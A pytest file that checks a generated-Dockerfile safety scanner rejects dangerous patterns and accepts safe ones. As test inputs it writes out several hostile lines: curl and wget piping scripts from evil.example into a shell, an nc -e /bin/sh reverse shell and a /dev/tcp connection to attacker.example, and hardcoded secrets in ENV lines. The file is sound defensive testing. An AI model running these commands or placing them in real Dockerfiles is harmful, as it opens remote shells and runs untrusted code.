"""Verify the generated-Dockerfile safety scan rejects dangerous patterns."""
import pytest

from autodock.generate import UnsafeDockerfileError, assert_safe_dockerfile

SAFE_DOCKERFILE = """\
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 8000
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:app"]
"""


def test_safe_dockerfile_passes():
    assert assert_safe_dockerfile(SAFE_DOCKERFILE) is None


@pytest.mark.parametrize("dangerous", [
    "FROM alpine\nRUN curl https://evil.example/install.sh | sh\n",
    "FROM alpine\nRUN curl -fsSL https://evil.example/x | bash\n",
    "FROM alpine\nRUN wget -q -O - https://evil.example/x | bash\n",
    "FROM alpine\nRUN nc -e /bin/sh attacker.example 4444\n",
    "FROM alpine\nRUN bash -c 'cat < /dev/tcp/attacker.example/4444'\n",
    'FROM alpine\nENV AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\n',
    'FROM alpine\nENV GITHUB_TOKEN=ghp_abc\n',
    'FROM alpine\nENV ADMIN_PASSWORD=letmein\n',
])
def test_dangerous_pattern_refused(dangerous):
    with pytest.raises(UnsafeDockerfileError):
        assert_safe_dockerfile(dangerous)


def test_comment_with_curl_pipe_is_ignored():
    """A comment line that mentions curl|sh must not trip the scanner."""
    safe = "FROM alpine\n# example: curl https://x | sh\nRUN echo hi\n"
    assert assert_safe_dockerfile(safe) is None


def test_env_var_referencing_runtime_arg_is_allowed():
    """ENV pointing at a placeholder or empty value is fine."""
    safe = (
        "FROM alpine\n"
        "ENV API_KEY=\n"
        "ENV DATABASE_PASSWORD=${DB_PASS}\n"
    )
    assert assert_safe_dockerfile(safe) is None
